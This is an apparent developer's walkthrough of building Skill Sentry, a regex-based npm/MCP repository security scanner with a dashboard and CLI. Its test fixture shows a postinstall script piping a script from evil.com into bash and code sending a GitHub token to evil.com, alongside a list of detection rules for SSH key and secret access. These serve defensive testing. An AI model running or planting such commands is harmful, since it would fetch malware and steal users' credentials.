# How I Built Skill Sentry: From "Am I Safe?" to a Published npm Package in One Session

*A detailed walkthrough of building a zero-cost security scanner for the Claude MCP ecosystem. from pain point to production, step by step.*

---

## The Pain Point

I was about to install a Claude MCP skill someone shared in a community channel. My finger was on Enter. Then I stopped.

What actually happens when I type `npx some-mcp-skill`?

I opened the repo. I found a `postinstall` script that runs `execSync` with `child_process`. That means the moment I type `npm install`, this package opens a hidden terminal on my machine and runs commands. before I can even see what's inside.

Three other people had already installed it.

That's when I decided: I need a tool that checks BEFORE I install. And if I need it, other builders need it too.

---

## The Approach: Brain Before Face

Before touching any code, I had to decide what to build and in what order. The biggest mistake I could make was starting with a pretty dashboard and having nothing behind it.

**The principle:** Build the functional core first, then layer on the UI.

I broke it into 6 phases:

| Phase | What | Why This Order |
|-------|------|----------------|
| 1. Registry & Scaffolding | Types, constants, project setup | Everything depends on the data contract |
| 2. Security Auditor Engine | The scanner itself | This IS the product. if this doesn't work, nothing matters |
| 3. GitHub Actions | Automation pipeline | Makes the scanner run automatically |
| 4. Dashboard UI | The "face" | Now there's real data to display |
| 5. Submit Button | Community input | The growth engine |
| 6. Report Pages | Detailed results | The credibility builder |

**Key insight:** Phases 1-3 are the "brain." Nobody sees them, but without them the whole thing is a shell. Phase 4-6 are the "face". they only matter because the brain works.

---

## Phase 1: Define Before You Build

Before writing a single scanner function, I defined the data contract. the TypeScript types that every other part of the system depends on.

```typescript
// What does a finding look like?
interface AuditFinding {
  ruleId: string;       // e.g., "CRIT-001"
  severity: SeverityLevel;
  file: string;         // Where in the repo
  line: number | null;  // Exact line number
  match: string;        // The dangerous code
  message: string;      // Why it's dangerous
  score: number;        // How much it adds to risk
}

// What does a scanned repo look like?
interface RegistryEntry {
  owner: string;
  name: string;
  riskScore: number;    // 0-100, capped
  findings: AuditFinding[];
  verifiedSafe: boolean; // true only when score === 0
  // .. plus metadata
}
```

**Why this matters:** When I later built the scanner, the UI, and the GitHub Actions. they all spoke the same language. No integration bugs because the contract was defined first.

I also defined all 11 security rules upfront:

| Severity | What It Detects | Score |
|----------|----------------|-------|
| CRITICAL | `postinstall` scripts with shell commands | +100 |
| CRITICAL | Any `preinstall` script | +100 |
| HIGH | `eval()` usage | +50 |
| HIGH | `child_process` import | +50 |
| HIGH | `exec`/`spawn` calls | +50 |
| HIGH | SSH key access (`~/.ssh`, `id_rsa`) | +50 |
| HIGH | Reading secret env vars (`TOKEN`, `SECRET`, `KEY`) | +50 |
| MEDIUM | Obfuscated Base64 strings (>128 chars) | +20 |
| MEDIUM | Unpinned dependencies (`"*"`, `"latest"`) | +20 |
| MEDIUM | Suspicious network targets (pastebin, raw GitHub) | +20 |
| MEDIUM | Dynamic code loading | +20 |

The risk formula: `RiskScore = min(100, sum of all finding scores)`

---

## Phase 2: The Scanner - Keep It Stupid Simple

The auditor has three files, each doing one thing:

### clone-repo.ts: Get the code
```
Input:  GitHub URL
Output: Temp directory with repo files
Always: Cleanup the temp dir, even on error
```

The trick: Vercel (where the web app runs) doesn't have `git` installed. So the clone function has a fallback. if `git` isn't available, it downloads the repo as a tarball via the GitHub API and extracts it with the `tar` npm package. Same result, works everywhere.

### scan-files.ts: Find the threats
```
Input:  Directory path
Output: Array of AuditFindings

For each security rule:
  1. Find files matching the rule's targets (package.json or *.ts/*.js)
  2. Apply the regex pattern
  3. For each match: record file, line number, matched text
  4. Sort by severity (CRITICAL first)
```

No AST parsing. No dependency graph. Just regex. Why? Because:
- Most npm supply chain attacks are lazy. `postinstall: "curl | bash"` is trivially detectable
- Regex is fast (scans 1,000+ files in seconds)
- Zero dependencies (Node.js built-ins only)
- A 90% solution in 5 seconds beats a 99% solution that takes 5 minutes

### auditor.ts: Orchestrate
```
Input:  GitHub URL
Output: RegistryEntry (typed JSON)

1. Clone the repo
2. Read package.json for metadata
3. Scan all files
4. Compute risk score
5. Cleanup temp dir
6. Return results
```

**The critical design decision:** The auditor is completely stateless. URL in, JSON out. No database, no globals, no side effects. This means the same function works in:
- The CLI (`npx skill-sentry <url>`)
- The web API (`/api/submit`)
- GitHub Actions (daily scraper)
- Tests (with local fixture directories)

One function, four callers, zero integration bugs.

---

## Phase 2b: Prove It Works With Tests

I created two fixture directories. fake repos with known contents:

**safe-repo/** - Clean package.json, normal TypeScript, no threats.

**malicious-repo/** - A horror show:
```json
{
  "scripts": {
    "postinstall": "curl http://evil.com/payload.sh | bash"
  },
  "dependencies": { "express": "*" }
}
```
```typescript
import { exec } from "child_process";
const token = process.env.GITHUB_TOKEN;
const payload = eval("atob('dGVzdA==')");
exec(`curl -H "Authorization: ${token}" http://evil.com/exfil`);
```

Then 20 tests proving every rule works:
- Safe repo → 0 findings, score 0, verifiedSafe: true
- Malicious repo → catches CRIT-001, HIGH-001/002/003/005, MED-001/002
- Risk score capped at 100
- Findings sorted by severity
- URL parsing handles edge cases

**Running the tests:**
```bash
npm test  # 20 tests, ~200ms
```

---

## Phase 3: Automation - The Growth Engine

Three GitHub Actions workflows:

### reusable-auditor.yml: The core muscle
Called by other workflows. Accepts a URL, runs the scanner, outputs JSON. Never run directly.

### on-demand-scan.yml: The Submit button trigger
Listens for `repository_dispatch` events. When someone clicks "Scan Skill" on the dashboard, this fires. (Later replaced by direct API scanning for speed.)

### scheduled-scrape.yml: The daily discovery
Runs at 06:00 UTC every day. Searches GitHub for repos tagged `mcp-server`, `mcp-tool`, `claude-skill`, `model-context-protocol`. Skips repos already scanned. Audits each new one. Commits results.

**The "database":** A JSON file (`registry.json`) committed to git. No PostgreSQL, no Redis, no DynamoDB. Git IS the database. GitHub Actions commit scan results, Vercel reads the file at build time. Total cost: $0.

### The scraper script
```typescript
// For each topic in ["mcp-server", "mcp-tool", "claude-skill", ..]
//   Search GitHub API: /search/repositories?q=topic:{topic}
//   Skip repos already in registry (dedup by owner/name)
//   Output new repos as newline-delimited JSON
```

The registry went from 2 mock entries to 128 real scans automatically.

---

## Phase 4: The Dashboard - Dark Industrial Aesthetic

The UI had to communicate one thing at a glance: **this is a security tool you can trust.**

### Design decisions:
- **Dark theme** (#0a0a0f near-black): security tools are dark. Period.
- **JetBrains Mono** for headings: monospace = hacker/command center feel
- **Outfit** for body text: geometric, modern, NOT Inter/Roboto
- **Teal (#00e5a0)** for "safe": calm, reassuring
- **Red (#ff0040)** for "critical": with a subtle pulse animation
- **Atmospheric depth**: radial gradients, noise texture overlay, glow effects

### Components built:
- **RiskBadge**: Color-coded score badge, pulses red for critical
- **ThreatBar**: Stacked bar showing finding distribution by severity
- **StatsHeader**: 4 clickable stat tiles (filter the table when clicked)
- **SearchFilter**: Debounced search + "Verified Safe Only" toggle
- **SkillsTable**: Desktop table + mobile card layout, sortable
- **News Ticker**: Scrolling marquee showing top finding + most popular safe repo

### The server/client split:
Next.js App Router uses React Server Components. Functions that read files (`fs.readFileSync`) can only run on the server. Functions used in interactive components need to be client-safe.

Solution: `lib/registry.ts` (server-only, reads files) and `lib/registry-utils.ts` (client-safe, pure functions). Import from the right one.

---

## Phase 5: The Submit Button. Instant Results

### Version 1 (too slow):
Submit → trigger GitHub Action → wait 1-3 minutes → poll for results.

Nobody waited. Users clicked submit and wondered "what happened?"

### Version 2 (instant):
Submit → API route runs `auditRepo()` directly → results in 5-15 seconds.

The scanner runs inside the Vercel serverless function. No GitHub Action needed for user submissions. The Action pipeline still exists for the daily scraper.

### The results panel:
Instead of navigating away, results appear inline:
1. Animated shield spinner during scan
2. Verdict banner (safe/caution/danger/do-not-install)
3. All findings in plain English
4. "View on GitHub" + "Scan Another" buttons

---

## Phase 6: Report Pages + Polish

Per-repo detail pages at `/repo/[owner]/[name]` with:
- Full findings with plain English explanations
- Line-linked source code (click to see the exact line on GitHub)
- Finding summary grid (CRITICAL/HIGH/MEDIUM/LOW/INFO counts)
- SEO metadata for sharing

---

## The Feature That Changed Everything: Plain English

The first version showed technical descriptions:

> "Importing child_process gives the package ability to spawn shell commands."

A developer reads that and thinks "so what?"

The new version:

> "Caution. This package can open a terminal on your computer and run any command it wants. with YOUR permissions. It could delete files, install malware, or steal your data without you seeing anything happen."

Now they understand. Every security rule has two descriptions:
- `description`. technical, for security people
- `plainEnglish`. human, for everyone else

The plain English version shows first. Technical details are behind a collapsible "Technical details" toggle.

---

## Verified Publishers & Typosquat Detection

### The problem:
Scanning `stripe/agent-toolkit` and saying "DO NOT INSTALL" because it reads `STRIPE_API_KEY` is misleading. It's Stripe. Of course it reads Stripe keys.

### The solution:
A verified publishers list. Known orgs (Stripe, Anthropic, Supabase, GitHub, etc.) get a purple "Verified Publisher" verdict. Findings are shown but explained as expected behavior.

### The bigger threat:
Someone creates `stripee/agent-toolkit` or `supabase-official/mcp-server`. Looks legitimate at a glance. This is called typosquatting.

The scanner uses Levenshtein distance to detect this. If a repo owner is within 2 character edits of a verified publisher, it shows a red warning: "This looks like a fake Stripe account."

---

## The npm Package

The final step: making it available to everyone without them needing to visit the website.

```bash
npx skill-sentry https://github.com/owner/repo
```

The published package is only 22KB. It includes:
- `bin/skill-sentry.ts`. CLI with colored output
- `scripts/auditor.ts` + `clone-repo.ts` + `scan-files.ts`. the scanner
- `lib/types.ts` + `constants.ts` + `registry-utils.ts`. types and rules
- `lib/verified-publishers.ts`. publisher whitelist + typosquat detection

Exit codes make it CI-friendly:
- `0` = safe
- `1` = findings detected
- `2` = error

```bash
# Block PRs that add dangerous dependencies
npx skill-sentry https://github.com/owner/new-dep || exit 1
```

---

## The Architecture. Zero Cost

| Layer | Technology | Cost |
|-------|-----------|------|
| Frontend | Next.js 15, Tailwind, Shadcn UI | Free (Vercel) |
| Database | `registry.json` in git | Free |
| Scanner | TypeScript + regex | Free |
| Automation | GitHub Actions (3 workflows) | Free (public repo) |
| API | Next.js API routes | Free (Vercel) |
| npm package | Published on npmjs.com | Free |
| Domain | Vercel subdomain | Free |

**Total monthly cost: $0**

---

## What I Got Wrong (And Fixed)

### 1. Vercel has no git or tar
The scanner used `git clone` which doesn't exist on Vercel's serverless runtime. Fix: download tarball via GitHub API + extract with the `tar` npm package.

### 2. The scanner flagged itself
Our `constants.ts` contains regex patterns for SSH keys. the scanner's own rules matched the rule definitions. Fix: skip `constants.ts` and config files.

### 3. "Scan triggered!" then nothing
Users clicked submit and saw a success message that disappeared after 5 seconds. They had no idea where to find results. Fix: inline results panel with animated loader and verdict.

### 4. The submit was too slow
Version 1 dispatched to GitHub Actions (1-3 minute wait). Nobody waited. Fix: run the scan directly in the API route (5-15 seconds).

### 5. Misleading verdicts for legitimate tools
Stripe's toolkit scored 100/100 "DO NOT INSTALL" because it reads API keys. Fix: verified publishers list + context-aware verdicts.

### 6. No mobile support
The table went off-screen on phones. Fix: card layout below 768px with sort pills.

---

## What I'd Do Differently

1. **AST parsing instead of regex**. would eliminate false positives from strings that happen to match patterns. But regex shipped in one session; AST would take a week.

2. **Dependency tree scanning**. check if sub-dependencies are malicious, not just the top-level package. This is what Snyk does well.

3. **A proper database**. `registry.json` works at 128 entries. At 10,000 it'll be slow. SQLite or Turso would be the next step.

4. **User accounts**. let people save scans, get notifications when a repo they use gets flagged.

---

## The Numbers

- **Time to build:** One session (a few hours with Claude)
- **Lines of code:** ~3,000 (scanner + UI + actions + tests)
- **npm package size:** 22KB
- **Test coverage:** 20 tests, all passing
- **Registry:** 128 repos scanned, growing daily
- **Cost:** $0/month
- **Dependencies added for scanner:** 1 (`tar`)

---

## Tools Used

- **Claude Code** (Opus). pair programming partner for the entire build
- **PAUL framework**. project management (phases, plans, apply, unify loops)
- **Next.js 15**. App Router with React Server Components
- **Tailwind CSS v4** + **Shadcn UI**. styling and components
- **Vitest**. testing
- **GitHub Actions**. automation
- **Vercel**. hosting
- **npm**. package publishing

---

## How to Build Something Like This

If you have a pain point and want to build a tool:

1. **Start with the data contract.** Define your types before writing logic. What goes in, what comes out, what shape is it?

2. **Build the core function first.** Make it stateless. input in, output out, no side effects. This lets you test it, call it from anywhere, and reason about it easily.

3. **Prove it works with tests.** Create fixtures with known inputs and expected outputs. If the tests pass, the core works.

4. **Automate before beautifying.** Wire up the pipeline (Actions, cron, API routes) before making the UI pretty. A beautiful dashboard with no data is useless.

5. **Be honest about limitations.** Users trust tools that say "here's what I can't do" more than tools that pretend to be perfect.

6. **Ship fast, iterate publicly.** Version 1 had bugs (no git on Vercel, flagged itself, slow submissions). Every bug was fixed in minutes because the architecture was simple.

7. **Make it free.** Zero cost means zero barriers to adoption. Git-as-a-DB, Vercel free tier, GitHub Actions on public repos. there are enough free tools to build real products.

---

## Links

- **Dashboard:** [your Vercel URL]
- **GitHub:** https://github.com/mamabearmehmi-hub/skill-sentry
- **npm:** https://www.npmjs.com/package/skill-sentry
- **CLI:** `npx skill-sentry https://github.com/owner/repo`

---

*Built by V. just a builder who wanted to feel safe clicking install.*
